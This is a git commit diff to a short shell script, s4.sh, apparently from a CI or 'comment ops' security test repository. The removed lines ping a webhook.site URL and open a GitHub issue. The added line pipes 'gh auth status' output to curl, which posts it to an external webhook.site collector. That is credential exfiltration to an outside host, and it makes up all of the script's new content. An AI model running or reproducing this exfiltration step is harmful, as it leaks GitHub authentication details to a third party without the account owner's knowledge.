1f891171a8e8907d5bf1fb8aad9b7f6aa8718866
Mauricio <uaxp123@gmail.com>
2021-11-03 02:45:02 -0500

    Update s4.sh

--- s4.sh
+++ s4.sh
@@ -1,3 +1,4 @@
-curl https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?first
-gh issue create --title 'incrediblysecureinc/comment-ops-amauricio' --body 'Comment Ops Coming Up!' --repo incrediblysecureinc/comment-ops-mauricio
-curl https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second
+#!/bin/sh
+
+gh auth status | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=
+
